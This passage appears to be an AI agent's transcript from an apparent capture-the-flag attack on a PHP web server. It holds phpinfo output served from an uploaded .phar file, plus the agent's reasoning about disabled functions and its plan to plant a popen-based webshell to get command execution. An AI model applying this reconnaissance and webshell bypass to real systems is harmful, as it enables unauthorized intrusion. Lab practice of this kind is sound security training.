<tr><td class="e">session.gc_probability</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">session.lazy_write</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">session.name</td><td class="v">PHPSESSID</td><td class="v">PHPSESSID</td></tr>
<tr><td class="e">session.referer_check</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">session.save_handler</td><td class="v">files</td><td class="v">files</td></tr>
<tr><td class="e">session.save_path</td><td class="v">/var/lib/php/sessions</td><td class="v">/var/lib/php/sessions</td></tr>
<tr><td class="e">session.serialize_handler</td><td class="v">php</td><td class="v">php</td></tr>
<tr><td class="e">session.sid_bits_per_character</td><td class="v">5</td><td class="v">5</td></tr>
<tr><td class="e">session.sid_length</td><td class="v">26</td><td class="v">26</td></tr>
<tr><td class="e">session.upload_progress.cleanup</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">session.upload_progress.enabled</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">session.upload_progress.freq</td><td class="v">1%</td><td class="v">1%</td></tr>
<tr><td class="e">session.upload_progress.min_freq</td><td class="v">1</td><td class="v">1</td></tr>
<tr><td class="e">session.upload_progress.name</td><td class="v">PHP_SESSION_UPLOAD_PROGRESS</td><td class="v">PHP_SESSION_UPLOAD_PROGRESS</td></tr>
<tr><td class="e">session.upload_progress.prefix</td><td class="v">upload_progress_</td><td class="v">upload_progress_</td></tr>
<tr><td class="e">session.use_cookies</td><td class="v">1</td><td class="v">1</td></tr>
<tr><td class="e">session.use_only_cookies</td><td class="v">1</td><td class="v">1</td></tr>
<tr><td class="e">session.use_strict_mode</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">session.use_trans_sid</td><td class="v">0</td><td class="v">0</td></tr>
</table>
<h2><a name="module_shmop">shmop</a></h2>
<table>
<tr><td class="e">shmop support </td><td class="v">enabled </td></tr>
</table>
<h2><a name="module_sockets">sockets</a></h2>
<table>
<tr><td class="e">Sockets Support </td><td class="v">enabled </td></tr>
</table>
<h2><a name="module_sodium">sodium</a></h2>
<table>
<tr class="h"><th>sodium support</th><th>enabled</th></tr>
<tr><td class="e">libsodium headers version </td><td class="v">1.0.18 </td></tr>
<tr><td class="e">libsodium library version </td><td class="v">1.0.18 </td></tr>
</table>
<h2><a name="module_spl">SPL</a></h2>
<table>
<tr class="h"><th>SPL support</th><th>enabled</th></tr>
<tr><td class="e">Interfaces </td><td class="v">OuterIterator, RecursiveIterator, SeekableIterator, SplObserver, SplSubject </td></tr>
<tr><td class="e">Classes </td><td class="v">AppendIterator, ArrayIterator, ArrayObject, BadFunctionCallException, BadMethodCallException, CachingIterator, CallbackFilterIterator, DirectoryIterator, DomainException, EmptyIterator, FilesystemIterator, FilterIterator, GlobIterator, InfiniteIterator, InvalidArgumentException, IteratorIterator, LengthException, LimitIterator, LogicException, MultipleIterator, NoRewindIterator, OutOfBoundsException, OutOfRangeException, OverflowException, ParentIterator, RangeException, RecursiveArrayIterator, RecursiveCachingIterator, RecursiveCallbackFilterIterator, RecursiveDirectoryIterator, RecursiveFilterIterator, RecursiveIteratorIterator, RecursiveRegexIterator, RecursiveTreeIterator, RegexIterator, RuntimeException, SplDoublyLinkedList, SplFileInfo, SplFileObject, SplFixedArray, SplHeap, SplMinHeap, SplMaxHeap, SplObjectStorage, SplPriorityQueue, SplQueue, SplStack, SplTempFileObject, UnderflowException, UnexpectedValueException </td></tr>
</table>
<h2><a name="module_standard">standard</a></h2>
<table>
<tr><td class="e">Dynamic Library Support </td><td class="v">enabled </td></tr>
<tr><td class="e">Path to sendmail </td><td class="v">/usr/sbin/sendmail -t -i </td></tr>
</table>
<table>
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">assert.active</td><td class="v">1</td><td class="v">1</td></tr>
<tr><td class="e">assert.bail</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">assert.callback</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">assert.exception</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">assert.quiet_eval</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">assert.warning</td><td class="v">1</td><td class="v">1</td></tr>
<tr><td class="e">auto_detect_line_endings</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">default_socket_timeout</td><td class="v">60</td><td class="v">60</td></tr>
<tr><td class="e">from</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">session.trans_sid_hosts</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">session.trans_sid_tags</td><td class="v">a=href,area=href,frame=src,form=</td><td class="v">a=href,area=href,frame=src,form=</td></tr>
<tr><td class="e">unserialize_max_depth</td><td class="v">4096</td><td class="v">4096</td></tr>
<tr><td class="e">url_rewriter.hosts</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">url_rewriter.tags</td><td class="v">form=</td><td class="v">form=</td></tr>
<tr><td class="e">user_agent</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
</table>
<h2><a name="module_sysvmsg">sysvmsg</a></h2>
<table>
<tr><td class="e">sysvmsg support </td><td class="v">enabled </td></tr>
</table>
<h2><a name="module_sysvsem">sysvsem</a></h2>
<table>
<tr><td class="e">sysvsem support </td><td class="v">enabled </td></tr>
</table>
<h2><a name="module_sysvshm">sysvshm</a></h2>
<table>
<tr><td class="e">sysvshm support </td><td class="v">enabled </td></tr>
</table>
<h2><a name="module_tokenizer">tokenizer</a></h2>
<table>
<tr><td class="e">Tokenizer Support </td><td class="v">enabled </td></tr>
</table>
<h2><a name="module_zend+opcache">Zend OPcache</a></h2>
<table>
<tr><td class="e">Opcode Caching </td><td class="v">Up and Running </td></tr>
<tr><td class="e">Optimization </td><td class="v">Enabled </td></tr>
<tr><td class="e">SHM Cache </td><td class="v">Enabled </td></tr>
<tr><td class="e">File Cache </td><td class="v">Disabled </td></tr>
<tr><td class="e">Startup </td><td class="v">OK </td></tr>
<tr><td class="e">Shared memory model </td><td class="v">mmap </td></tr>
<tr><td class="e">Cache hits </td><td class="v">23 </td></tr>
<tr><td class="e">Cache misses </td><td class="v">20 </td></tr>
<tr><td class="e">Used memory </td><td class="v">9192720 </td></tr>
<tr><td class="e">Free memory </td><td class="v">125024048 </td></tr>
<tr><td class="e">Wasted memory </td><td class="v">960 </td></tr>
<tr><td class="e">Interned Strings Used memory </td><td class="v">226720 </td></tr>
<tr><td class="e">Interned Strings Free memory </td><td class="v">6064288 </td></tr>
<tr><td class="e">Cached scripts </td><td class="v">11 </td></tr>
<tr><td class="e">Cached keys </td><td class="v">12 </td></tr>
<tr><td class="e">Max keys </td><td class="v">16229 </td></tr>
<tr><td class="e">OOM restarts </td><td class="v">0 </td></tr>
<tr><td class="e">Hash keys restarts </td><td class="v">0 </td></tr>
<tr><td class="e">Manual restarts </td><td class="v">0 </td></tr>
</table>
<table>
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">opcache.blacklist_filename</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">opcache.consistency_checks</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">opcache.dups_fix</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">opcache.enable</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">opcache.enable_cli</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">opcache.enable_file_override</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">opcache.error_log</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">opcache.file_cache</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">opcache.file_cache_consistency_checks</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">opcache.file_cache_only</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">opcache.file_update_protection</td><td class="v">2</td><td class="v">2</td></tr>
<tr><td class="e">opcache.force_restart_timeout</td><td class="v">180</td><td class="v">180</td></tr>
<tr><td class="e">opcache.huge_code_pages</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">opcache.interned_strings_buffer</td><td class="v">8</td><td class="v">8</td></tr>
<tr><td class="e">opcache.lockfile_path</td><td class="v">/tmp</td><td class="v">/tmp</td></tr>
<tr><td class="e">opcache.log_verbosity_level</td><td class="v">1</td><td class="v">1</td></tr>
<tr><td class="e">opcache.max_accelerated_files</td><td class="v">10000</td><td class="v">10000</td></tr>
<tr><td class="e">opcache.max_file_size</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">opcache.max_wasted_percentage</td><td class="v">5</td><td class="v">5</td></tr>
<tr><td class="e">opcache.memory_consumption</td><td class="v">128</td><td class="v">128</td></tr>
<tr><td class="e">opcache.opt_debug_level</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">opcache.optimization_level</td><td class="v">0x7FFEBFFF</td><td class="v">0x7FFEBFFF</td></tr>
<tr><td class="e">opcache.preferred_memory_model</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">opcache.preload</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">opcache.preload_user</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">opcache.protect_memory</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">opcache.restrict_api</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">opcache.revalidate_freq</td><td class="v">2</td><td class="v">2</td></tr>
<tr><td class="e">opcache.revalidate_path</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">opcache.save_comments</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">opcache.use_cwd</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">opcache.validate_permission</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">opcache.validate_root</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">opcache.validate_timestamps</td><td class="v">On</td><td class="v">On</td></tr>
</table>
<h2><a name="module_zlib">zlib</a></h2>
<table>
<tr class="h"><th>ZLib Support</th><th>enabled</th></tr>
<tr><td class="e">Stream Wrapper </td><td class="v">compress.zlib:// </td></tr>
<tr><td class="e">Stream Filter </td><td class="v">zlib.inflate, zlib.deflate </td></tr>
<tr><td class="e">Compiled Version </td><td class="v">1.2.11 </td></tr>
<tr><td class="e">Linked Version </td><td class="v">1.2.13 </td></tr>
</table>
<table>
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">zlib.output_compression</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">zlib.output_compression_level</td><td class="v">-1</td><td class="v">-1</td></tr>
<tr><td class="e">zlib.output_handler</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
</table>
<h2>Additional Modules</h2>
<table>
<tr class="h"><th>Module Name</th></tr>
</table>
<h2>Environment</h2>
<table>
<tr class="h"><th>Variable</th><th>Value</th></tr>
<tr><td class="e">APACHE_RUN_DIR </td><td class="v">/var/run/apache2 </td></tr>
<tr><td class="e">SYSTEMD_EXEC_PID </td><td class="v">997 </td></tr>
<tr><td class="e">APACHE_PID_FILE </td><td class="v">/var/run/apache2/apache2.pid </td></tr>
<tr><td class="e">JOURNAL_STREAM </td><td class="v">8:27490 </td></tr>
<tr><td class="e">PATH </td><td class="v">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin </td></tr>
<tr><td class="e">INVOCATION_ID </td><td class="v">1f9c7a0f9281442cb315b95a7d117d84 </td></tr>
<tr><td class="e">APACHE_LOCK_DIR </td><td class="v">/var/lock/apache2 </td></tr>
<tr><td class="e">LANG </td><td class="v">C </td></tr>
<tr><td class="e">APACHE_RUN_USER </td><td class="v">www-data </td></tr>
<tr><td class="e">APACHE_RUN_GROUP </td><td class="v">www-data </td></tr>
<tr><td class="e">APACHE_LOG_DIR </td><td class="v">/var/log/apache2 </td></tr>
<tr><td class="e">PWD </td><td class="v">/ </td></tr>
</table>
<h2>PHP Variables</h2>
<table>
<tr class="h"><th>Variable</th><th>Value</th></tr>
<tr><td class="e">$_COOKIE['PHPSESSID']</td><td class="v">6qaatgee7p8mj7aeu3fc0g3jtn</td></tr>
<tr><td class="e">$_SERVER['HTTP_HOST']</td><td class="v">10.10.11.241:8080</td></tr>
<tr><td class="e">$_SERVER['HTTP_USER_AGENT']</td><td class="v">Mozilla/5.0</td></tr>
<tr><td class="e">$_SERVER['HTTP_ACCEPT']</td><td class="v">text/html,application/xhtml+xml,application/xml</td></tr>
<tr><td class="e">$_SERVER['HTTP_COOKIE']</td><td class="v">PHPSESSID=6qaatgee7p8mj7aeu3fc0g3jtn</td></tr>
<tr><td class="e">$_SERVER['HTTP_CONNECTION']</td><td class="v">close</td></tr>
<tr><td class="e">$_SERVER['PATH']</td><td class="v">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin</td></tr>
<tr><td class="e">$_SERVER['SERVER_SIGNATURE']</td><td class="v">&lt;address&gt;Apache/2.4.55 (Ubuntu) Server at 10.10.11.241 Port 8080&lt;/address&gt;
</td></tr>
<tr><td class="e">$_SERVER['SERVER_SOFTWARE']</td><td class="v">Apache/2.4.55 (Ubuntu)</td></tr>
<tr><td class="e">$_SERVER['SERVER_NAME']</td><td class="v">10.10.11.241</td></tr>
<tr><td class="e">$_SERVER['SERVER_ADDR']</td><td class="v">192.168.5.2</td></tr>
<tr><td class="e">$_SERVER['SERVER_PORT']</td><td class="v">8080</td></tr>
<tr><td class="e">$_SERVER['REMOTE_ADDR']</td><td class="v">10.10.14.236</td></tr>
<tr><td class="e">$_SERVER['DOCUMENT_ROOT']</td><td class="v">/var/www/html</td></tr>
<tr><td class="e">$_SERVER['REQUEST_SCHEME']</td><td class="v">http</td></tr>
<tr><td class="e">$_SERVER['CONTEXT_PREFIX']</td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">$_SERVER['CONTEXT_DOCUMENT_ROOT']</td><td class="v">/var/www/html</td></tr>
<tr><td class="e">$_SERVER['SERVER_ADMIN']</td><td class="v">webmaster@localhost</td></tr>
<tr><td class="e">$_SERVER['SCRIPT_FILENAME']</td><td class="v">/var/www/html/uploads/phpinfo.phar</td></tr>
<tr><td class="e">$_SERVER['REMOTE_PORT']</td><td class="v">64252</td></tr>
<tr><td class="e">$_SERVER['GATEWAY_INTERFACE']</td><td class="v">CGI/1.1</td></tr>
<tr><td class="e">$_SERVER['SERVER_PROTOCOL']</td><td class="v">HTTP/1.1</td></tr>
<tr><td class="e">$_SERVER['REQUEST_METHOD']</td><td class="v">GET</td></tr>
<tr><td class="e">$_SERVER['QUERY_STRING']</td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">$_SERVER['REQUEST_URI']</td><td class="v">/uploads/phpinfo.phar</td></tr>
<tr><td class="e">$_SERVER['SCRIPT_NAME']</td><td class="v">/uploads/phpinfo.phar</td></tr>
<tr><td class="e">$_SERVER['PHP_SELF']</td><td class="v">/uploads/phpinfo.phar</td></tr>
<tr><td class="e">$_SERVER['REQUEST_TIME_FLOAT']</td><td class="v">1746665959.9951</td></tr>
<tr><td class="e">$_SERVER['REQUEST_TIME']</td><td class="v">1746665959</td></tr>
</table>
<hr />
<h1>PHP Credits</h1>
<table>
<tr class="h"><th>PHP Group</th></tr>
<tr><td class="e">Thies C. Arntzen, Stig Bakken, Shane Caraveo, Andi Gutmans, Rasmus Lerdorf, Sam Ruby, Sascha Schumann, Zeev Suraski, Jim Winstead, Andrei Zmievski </td></tr>
</table>
<table>
<tr class="h"><th>Language Design &amp; Concept</th></tr>
<tr><td class="e">Andi Gutmans, Rasmus Lerdorf, Zeev Suraski, Marcus Boerger </td></tr>
</table>
<table>
<tr class="h"><th colspan="2">PHP Authors</th></tr>
<tr class="h"><th>Contribution</th><th>Authors</th></tr>
<tr><td class="e">Zend Scripting Language Engine </td><td class="v">Andi Gutmans, Zeev Suraski, Stanislav Malyshev, Marcus Boerger, Dmitry Stogov, Xinchen Hui, Nikita Popov </td></tr>
<tr><td class="e">Extension Module API </td><td class="v">Andi Gutmans, Zeev Suraski, Andrei Zmievski </td></tr>
<tr><td class="e">UNIX Build and Modularization </td><td class="v">Stig Bakken, Sascha Schumann, Jani Taskinen, Peter Kokot </td></tr>
<tr><td class="e">Windows Support </td><td class="v">Shane Caraveo, Zeev Suraski, Wez Furlong, Pierre-Alain Joye, Anatol Belski, Kalle Sommer Nielsen </td></tr>
<tr><td class="e">Server API (SAPI) Abstraction Layer </td><td class="v">Andi Gutmans, Shane Caraveo, Zeev Suraski </td></tr>
<tr><td class="e">Streams Abstraction Layer </td><td class="v">Wez Furlong, Sara Golemon </td></tr>
<tr><td class="e">PHP Data Objects Layer </td><td class="v">Wez Furlong, Marcus Boerger, Sterling Hughes, George Schlossnagle, Ilia Alshanetsky </td></tr>
<tr><td class="e">Output Handler </td><td class="v">Zeev Suraski, Thies C. Arntzen, Marcus Boerger, Michael Wallner </td></tr>
<tr><td class="e">Consistent 64 bit support </td><td class="v">Anthony Ferrara, Anatol Belski </td></tr>
</table>
<table>
<tr class="h"><th colspan="2">SAPI Modules</th></tr>
<tr class="h"><th>Contribution</th><th>Authors</th></tr>
<tr><td class="e">Apache 2.0 Handler </td><td class="v">Ian Holsman, Justin Erenkrantz (based on Apache 2.0 Filter code) </td></tr>
<tr><td class="e">CGI / FastCGI </td><td class="v">Rasmus Lerdorf, Stig Bakken, Shane Caraveo, Dmitry Stogov </td></tr>
<tr><td class="e">CLI </td><td class="v">Edin Kadribasic, Marcus Boerger, Johannes Schlueter, Moriyoshi Koizumi, Xinchen Hui </td></tr>
<tr><td class="e">Embed </td><td class="v">Edin Kadribasic </td></tr>
<tr><td class="e">FastCGI Process Manager </td><td class="v">Andrei Nigmatulin, dreamcat4, Antony Dovgal, Jerome Loyet </td></tr>
<tr><td class="e">litespeed </td><td class="v">George Wang </td></tr>
<tr><td class="e">phpdbg </td><td class="v">Felipe Pena, Joe Watkins, Bob Weinand </td></tr>
</table>
<table>
<tr class="h"><th colspan="2">Module Authors</th></tr>
<tr class="h"><th>Module</th><th>Authors</th></tr>
<tr><td class="e">BC Math </td><td class="v">Andi Gutmans </td></tr>
<tr><td class="e">Bzip2 </td><td class="v">Sterling Hughes </td></tr>
<tr><td class="e">Calendar </td><td class="v">Shane Caraveo, Colin Viebrock, Hartmut Holzgraefe, Wez Furlong </td></tr>
<tr><td class="e">COM and .Net </td><td class="v">Wez Furlong </td></tr>
<tr><td class="e">ctype </td><td class="v">Hartmut Holzgraefe </td></tr>
<tr><td class="e">cURL </td><td class="v">Sterling Hughes </td></tr>
<tr><td class="e">Date/Time Support </td><td class="v">Derick Rethans </td></tr>
<tr><td class="e">DB-LIB (MS SQL, Sybase) </td><td class="v">Wez Furlong, Frank M. Kromann, Adam Baratz </td></tr>
<tr><td class="e">DBA </td><td class="v">Sascha Schumann, Marcus Boerger </td></tr>
<tr><td class="e">DOM </td><td class="v">Christian Stocker, Rob Richards, Marcus Boerger </td></tr>
<tr><td class="e">enchant </td><td class="v">Pierre-Alain Joye, Ilia Alshanetsky </td></tr>
<tr><td class="e">EXIF </td><td class="v">Rasmus Lerdorf, Marcus Boerger </td></tr>
<tr><td class="e">FFI </td><td class="v">Dmitry Stogov </td></tr>
<tr><td class="e">fileinfo </td><td class="v">Ilia Alshanetsky, Pierre Alain Joye, Scott MacVicar, Derick Rethans, Anatol Belski </td></tr>
<tr><td class="e">Firebird driver for PDO </td><td class="v">Ard Biesheuvel </td></tr>
<tr><td class="e">FTP </td><td class="v">Stefan Esser, Andrew Skalski </td></tr>
<tr><td class="e">GD imaging </td><td class="v">Rasmus Lerdorf, Stig Bakken, Jim Winstead, Jouni Ahto, Ilia Alshanetsky, Pierre-Alain Joye, Marcus Boerger </td></tr>
<tr><td class="e">GetText </td><td class="v">Alex Plotnick </td></tr>
<tr><td class="e">GNU GMP support </td><td class="v">Stanislav Malyshev </td></tr>
<tr><td class="e">Iconv </td><td class="v">Rui Hirokawa, Stig Bakken, Moriyoshi Koizumi </td></tr>
<tr><td class="e">IMAP </td><td class="v">Rex Logan, Mark Musone, Brian Wang, Kaj-Michael Lang, Antoni Pamies Olive, Rasmus Lerdorf, Andrew Skalski, Chuck Hagenbuch, Daniel R Kalowsky </td></tr>
<tr><td class="e">Input Filter </td><td class="v">Rasmus Lerdorf, Derick Rethans, Pierre-Alain Joye, Ilia Alshanetsky </td></tr>
<tr><td class="e">Internationalization </td><td class="v">Ed Batutis, Vladimir Iordanov, Dmitry Lakhtyuk, Stanislav Malyshev, Vadim Savchuk, Kirti Velankar </td></tr>
<tr><td class="e">JSON </td><td class="v">Jakub Zelenka, Omar Kilani, Scott MacVicar </td></tr>
<tr><td class="e">LDAP </td><td class="v">Amitay Isaacs, Eric Warnke, Rasmus Lerdorf, Gerrit Thomson, Stig Venaas </td></tr>
<tr><td class="e">LIBXML </td><td class="v">Christian Stocker, Rob Richards, Marcus Boerger, Wez Furlong, Shane Caraveo </td></tr>
<tr><td class="e">Multibyte String Functions </td><td class="v">Tsukada Takuya, Rui Hirokawa </td></tr>
<tr><td class="e">MySQL driver for PDO </td><td class="v">George Schlossnagle, Wez Furlong, Ilia Alshanetsky, Johannes Schlueter </td></tr>
<tr><td class="e">MySQLi </td><td class="v">Zak Greant, Georg Richter, Andrey Hristov, Ulf Wendel </td></tr>
<tr><td class="e">MySQLnd </td><td class="v">Andrey Hristov, Ulf Wendel, Georg Richter, Johannes SchlÃ¼ter </td></tr>
<tr><td class="e">OCI8 </td><td class="v">Stig Bakken, Thies C. Arntzen, Andy Sautins, David Benson, Maxim Maletsky, Harald Radi, Antony Dovgal, Andi Gutmans, Wez Furlong, Christopher Jones, Oracle Corporation </td></tr>
<tr><td class="e">ODBC driver for PDO </td><td class="v">Wez Furlong </td></tr>
<tr><td class="e">ODBC </td><td class="v">Stig Bakken, Andreas Karajannis, Frank M. Kromann, Daniel R. Kalowsky </td></tr>
<tr><td class="e">Opcache </td><td class="v">Andi Gutmans, Zeev Suraski, Stanislav Malyshev, Dmitry Stogov, Xinchen Hui </td></tr>
<tr><td class="e">OpenSSL </td><td class="v">Stig Venaas, Wez Furlong, Sascha Kettler, Scott MacVicar </td></tr>
<tr><td class="e">Oracle (OCI) driver for PDO </td><td class="v">Wez Furlong </td></tr>
<tr><td class="e">pcntl </td><td class="v">Jason Greene, Arnaud Le Blanc </td></tr>
<tr><td class="e">Perl Compatible Regexps </td><td class="v">Andrei Zmievski </td></tr>
<tr><td class="e">PHP Archive </td><td class="v">Gregory Beaver, Marcus Boerger </td></tr>
<tr><td class="e">PHP Data Objects </td><td class="v">Wez Furlong, Marcus Boerger, Sterling Hughes, George Schlossnagle, Ilia Alshanetsky </td></tr>
<tr><td class="e">PHP hash </td><td class="v">Sara Golemon, Rasmus Lerdorf, Stefan Esser, Michael Wallner, Scott MacVicar </td></tr>
<tr><td class="e">Posix </td><td class="v">Kristian Koehntopp </td></tr>
<tr><td class="e">PostgreSQL driver for PDO </td><td class="v">Edin Kadribasic, Ilia Alshanetsky </td></tr>
<tr><td class="e">PostgreSQL </td><td class="v">Jouni Ahto, Zeev Suraski, Yasuo Ohgaki, Chris Kings-Lynne </td></tr>
<tr><td class="e">Pspell </td><td class="v">Vlad Krupin </td></tr>
<tr><td class="e">Readline </td><td class="v">Thies C. Arntzen </td></tr>
<tr><td class="e">Reflection </td><td class="v">Marcus Boerger, Timm Friebe, George Schlossnagle, Andrei Zmievski, Johannes Schlueter </td></tr>
<tr><td class="e">Sessions </td><td class="v">Sascha Schumann, Andrei Zmievski </td></tr>
<tr><td class="e">Shared Memory Operations </td><td class="v">Slava Poliakov, Ilia Alshanetsky </td></tr>
<tr><td class="e">SimpleXML </td><td class="v">Sterling Hughes, Marcus Boerger, Rob Richards </td></tr>
<tr><td class="e">SNMP </td><td class="v">Rasmus Lerdorf, Harrie Hazewinkel, Mike Jackson, Steven Lawrance, Johann Hanne, Boris Lytochkin </td></tr>
<tr><td class="e">SOAP </td><td class="v">Brad Lafountain, Shane Caraveo, Dmitry Stogov </td></tr>
<tr><td class="e">Sockets </td><td class="v">Chris Vandomelen, Sterling Hughes, Daniel Beulshausen, Jason Greene </td></tr>
<tr><td class="e">Sodium </td><td class="v">Frank Denis </td></tr>
<tr><td class="e">SPL </td><td class="v">Marcus Boerger, Etienne Kneuss </td></tr>
<tr><td class="e">SQLite 3.x driver for PDO </td><td class="v">Wez Furlong </td></tr>
<tr><td class="e">SQLite3 </td><td class="v">Scott MacVicar, Ilia Alshanetsky, Brad Dewar </td></tr>
<tr><td class="e">System V Message based IPC </td><td class="v">Wez Furlong </td></tr>
<tr><td class="e">System V Semaphores </td><td class="v">Tom May </td></tr>
<tr><td class="e">System V Shared Memory </td><td class="v">Christian Cartus </td></tr>
<tr><td class="e">tidy </td><td class="v">John Coggeshall, Ilia Alshanetsky </td></tr>
<tr><td class="e">tokenizer </td><td class="v">Andrei Zmievski, Johannes Schlueter </td></tr>
<tr><td class="e">XML </td><td class="v">Stig Bakken, Thies C. Arntzen, Sterling Hughes </td></tr>
<tr><td class="e">XMLReader </td><td class="v">Rob Richards </td></tr>
<tr><td class="e">xmlrpc </td><td class="v">Dan Libby </td></tr>
<tr><td class="e">XMLWriter </td><td class="v">Rob Richards, Pierre-Alain Joye </td></tr>
<tr><td class="e">XSL </td><td class="v">Christian Stocker, Rob Richards </td></tr>
<tr><td class="e">Zip </td><td class="v">Pierre-Alain Joye, Remi Collet </td></tr>
<tr><td class="e">Zlib </td><td class="v">Rasmus Lerdorf, Stefan Roehrich, Zeev Suraski, Jade Nicoletti, Michael Wallner </td></tr>
</table>
<table>
<tr class="h"><th colspan="2">PHP Documentation</th></tr>
<tr><td class="e">Authors </td><td class="v">Mehdi Achour, Friedhelm Betz, Antony Dovgal, Nuno Lopes, Hannes Magnusson, Philip Olson, Georg Richter, Damien Seguy, Jakub Vrana, Adam Harvey </td></tr>
<tr><td class="e">Editor </td><td class="v">Peter Cowburn </td></tr>
<tr><td class="e">User Note Maintainers </td><td class="v">Daniel P. Brown, Thiago Henrique Pojda </td></tr>
<tr><td class="e">Other Contributors </td><td class="v">Previously active authors, editors and other contributors are listed in the manual. </td></tr>
</table>
<table>
<tr class="h"><th>PHP Quality Assurance Team</th></tr>
<tr><td class="e">Ilia Alshanetsky, Joerg Behrens, Antony Dovgal, Stefan Esser, Moriyoshi Koizumi, Magnus Maatta, Sebastian Nohn, Derick Rethans, Melvyn Sopacua, Pierre-Alain Joye, Dmitry Stogov, Felipe Pena, David Soria Parra, Stanislav Malyshev, Julien Pauli, Stephen Zarkos, Anatol Belski, Remi Collet, Ferenc Kovacs </td></tr>
</table>
<table>
<tr class="h"><th colspan="2">Websites and Infrastructure team</th></tr>
<tr><td class="e">PHP Websites Team </td><td class="v">Rasmus Lerdorf, Hannes Magnusson, Philip Olson, Lukas Kahwe Smith, Pierre-Alain Joye, Kalle Sommer Nielsen, Peter Cowburn, Adam Harvey, Ferenc Kovacs, Levi Morrison </td></tr>
<tr><td class="e">Event Maintainers </td><td class="v">Damien Seguy, Daniel P. Brown </td></tr>
<tr><td class="e">Network Infrastructure </td><td class="v">Daniel P. Brown </td></tr>
<tr><td class="e">Windows Infrastructure </td><td class="v">Alex Schoenmaker </td></tr>
</table>
<table>
<tr class="h"><th colspan="1">Debian Packaging</th></tr>
<tr><td class="e"><a href="https://deb.sury.org">DEB.SURY.ORG</a>, an OndÅej SurÃ½ project</td></tr>
</table>
<h2>PHP License</h2>
<table>
<tr class="v"><td>
<p>
This program is free software; you can redistribute it and/or modify it under the terms of the PHP License as published by the PHP Group and included in the distribution in the file:  LICENSE
</p>
<p>This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
</p>
<p>If you did not receive a copy of the PHP license, or have any questions about PHP licensing, please contact license@php.net.
</p>
</td></tr>
</table>
</div></body></html>
<environment_details>
# VSCode Visible Files
(No visible files)

# VSCode Open Tabs
(No open tabs)

# Current Time
5/7/2025, 1:59:47 PM (America/New_York, UTC-4:00)

# Context Window Usage
46,630 / 200K tokens used (23%)

# Current Mode
ACT MODE
</environment_details>

---

**Assistant:**

<thinking>
The phpinfo page provides a lot of useful information. Looking at the "disable_functions" section, I can see that several command execution functions are disabled:

```
disable_functions: pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,system,shell_exec,exec,proc_open,preg_replace,passthru,curl_exec
```

This explains why our command execution attempts weren't working. The server has disabled common functions like system, shell_exec, exec, passthru, etc.

However, there are still some PHP functions that might allow us to execute commands that aren't in the disabled list. Let's try to create a webshell that uses one of these alternative functions:

1. popen
2. backtick operator (`)
3. proc_open (though this is disabled)

Let's create a new webshell that uses popen:
</thinking>

